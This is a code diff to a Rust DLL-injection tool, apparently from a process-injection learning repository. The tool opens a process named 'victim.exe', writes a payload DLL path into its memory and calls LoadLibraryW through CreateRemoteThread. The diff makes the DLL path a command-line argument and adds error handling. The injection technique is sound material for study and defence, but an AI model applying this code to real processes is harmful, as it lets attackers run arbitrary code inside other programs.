@@ -1,4 +1,8 @@
-use common::{HandleRAII, RemoteAllocRAII, find_pid_by_name, open_process};
+use std::os::windows::ffi::OsStrExt;
+
+use common::raii::{HandleRAII, RemoteAllocRAII};
+use common::utils::{find_pid_by_name, open_process};
+
 use windows_sys::Win32::Foundation::{FALSE, GetLastError, HMODULE};
 use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
@@ -12,11 +16,9 @@ use windows_sys::core::{BOOL, PCSTR};
 fn main() {
     let victim_name = "victim.exe";
 
-    // Hardocded dll path for now, will figure out how to handle later
-    let dll_path: Vec<u16> = "C:\\Repo\\Cadevue\\process-injection\\target\\debug\\payload.dll"
-        .encode_utf16()
-        .chain(Some(0))
-        .collect();
+    let dll_path_arg = std::env::args().nth(1).expect("Usage: attack_01_dll_injection.exe <payload dll path>");
+    let dll_path = std::path::PathBuf::from(dll_path_arg).canonicalize().expect("DLL path invalid or not found");
+    let dll_path: Vec<u16> = dll_path.as_os_str().encode_wide().chain(Some(0)).collect();
 
     // Open Process
     let victim_pid = find_pid_by_name(victim_name).expect("Couldn't find the victim's process");
@@ -51,6 +53,13 @@ fn main() {
     // Resolve callback address
     let ke32_path: Vec<u16> = "kernel32.dll".encode_utf16().chain(Some(0)).collect();
     let ke32_mod: HMODULE = unsafe { GetModuleHandleW(ke32_path.as_ptr()) };
+    if ke32_mod.is_null() {
+        eprintln!("Failed to Get kernel32 Module Handle: {}", unsafe {
+            GetLastError()
+        });
+        return;
+    }
+
     let load_lib_addr = unsafe { GetProcAddress(ke32_mod, c"LoadLibraryW".as_ptr() as PCSTR) };
     if load_lib_addr.is_none() {
         eprintln!("Failed to Get LoadLibraryW Address: {}", unsafe {
@@ -66,7 +75,7 @@ fn main() {
     };
 
     // Create thread
-    let thread_h = unsafe {
+    let thread_h_raw = unsafe {
         CreateRemoteThread(
             victim.as_raw(),
             std::ptr::null_mut(),
@@ -77,10 +86,10 @@ fn main() {
             std::ptr::null_mut(),
         )
     };
-    let toh = HandleRAII::new(thread_h).expect("Unable to Retrieve Thread Handle");
+    let thread_h = HandleRAII::new(thread_h_raw).expect("Unable to Retrieve Thread Handle");
 
     // Wait for Running
     unsafe {
-        WaitForSingleObject(toh.as_raw(), 5000);
+        WaitForSingleObject(thread_h.as_raw(), 5000);
     }
 }
